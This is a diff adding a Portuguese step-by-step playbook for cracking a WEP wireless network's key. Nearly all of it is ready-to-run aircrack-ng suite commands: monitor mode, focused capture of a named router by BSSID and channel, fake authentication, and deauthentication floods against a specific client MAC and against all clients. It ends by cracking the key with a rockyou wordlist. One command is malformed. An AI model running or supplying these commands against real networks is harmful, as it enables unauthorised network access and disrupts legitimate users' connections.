@@ -1,0 +1,61 @@
+
+O Plano de Ataque O processo é dividido em cinco fases operacionais: 
+1.      Preparação: Ativação do modo monitor na interface de rede sem fio. 
+2.      Descoberta: Localização de redes WEP e identificação do alvo. 
+3.      Ataque: Captura de dados focada e injeção de pacotes para acelerar a coleta de IVs. 
+4.      Quebra: Análise dos dados capturados para extrair a chave WEP.
+5.      Conexão: Utilização da chave descoberta para acessar a rede. 
+
+#1 - Identificação da interface de rede sem fio
+
+iwconfig
+ifconfig
+
+#2 - Eliminação de processos conflitantes
+
+airmon-ng check kill
+
+#3 - Ativar o modo monitor
+
+airmon-ng start wlan0
+
+#4 - Ativar o monitoramento em wlan0mon
+
+airodump-ng wlan0mon
+
+#5 - Descobrir o alvo e fazer a identificação 
+Anotar o BSSID (mac do roteador) e o Chanal
+C0:3D:D9:8F:93:40 e canal 11
+
+#6A - Iniciar a captura focada no alvo - Terminal 1
+
+airodump-ng --bssid C0:3D:D9:8F:93:40 -c 11 -w captura_salva wlan0mon
+
+#6B - Realizar diversas falsas autenticação com o ponto de acesso - Terminal 2
+
+aireplay-ng -1 0 -a --bssid C0:3D:D9:8F:93:40 wlan0mon
+
+#7B - Iniciar ataque de desautenticação da rede focado em um dispositivo apenas
+
+aireplay-ng -0 150 -a C0:3D:D9:8F:93:40 -c 00:16:D0:39:57:6B wlan0mon
+aireplay-ng -0 150 -a C0:3D:D9:8F:93:40 wlan0mon
+
+#8 - Parar a leitura / Parar o ataque - Terminal 1 e Terminal 2
+
+Ctrl+C
+
+#9 - Quebrar a senha 
+
+aircrack-ng -b C0:3D:D9:8F:93:40 -w /usr/share/wordlists/rockyou.txt  captura_salva-01.cap
+
+
+
+
+
+
+################################################################
+
+NOTAS
+
+1 - É rápido descobrir a senha (5 dígitos) se o número de IVs for alto
+2 - Gerar um alto número de IVs na etapa de análise
